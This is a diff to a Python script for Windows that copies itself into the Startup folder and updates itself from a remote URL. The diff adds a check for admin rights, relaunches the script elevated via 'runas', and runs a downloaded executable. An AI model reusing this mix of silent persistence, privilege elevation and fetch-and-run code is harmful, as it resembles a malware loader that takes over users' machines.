@@ -10,11 +10,21 @@ import shutil
 import time
 import platform
 import traceback
+import ctypes
 
 user_name = getuser()
 startup = 'C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'.format(user_name)
 script_path = sys.argv[0]
 destination_path = os.path.join(startup, os.path.basename(script_path))
+
+def is_admin():
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+    
+def run_with_admin_rights():
+    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
 
 if not os.path.exists(destination_path):
     shutil.copy(script_path, destination_path)
@@ -38,6 +48,9 @@ def fetch_data_from_url(url):
         return None
 
 def needToUpdate(url, file_path):
+    if not is_admin():
+        run_with_admin_rights()
+        # sys.exit(0)
     url_data = fetch_data_from_url(url)
 
     if url_data is not None:
@@ -58,6 +71,9 @@ def needToUpdate(url, file_path):
         return "Fetch Error"
 
 def update(local_path, github_url, exe_path):
+    if not is_admin():
+        run_with_admin_rights()
+        # sys.exit(0)
     exclude_folders = ['.upm', '.pythonlibs']
     exclude_files = ['.replit', 'pyproject.toml', 'poetry.lock']
     for root, dirs, files in os.walk(local_path, topdown=False):
@@ -87,9 +103,8 @@ if checker:
   update(program_files_path, downloadUrl, exe_path)#os.getcwd(), downloadUrl, exe_path)
 else:
   print(checker)
-
-
-# if os.path.exists(exe_path):
-    # print(f"Path to executable: {exe_path}")
-# else:
-    # print("Executable not found in the specified path.")
+  try:
+      subprocess.run([exe_path])
+      print("Executable file ran successfully.")
+  except subprocess.CalledProcessError as e:
+      handle_error(e)
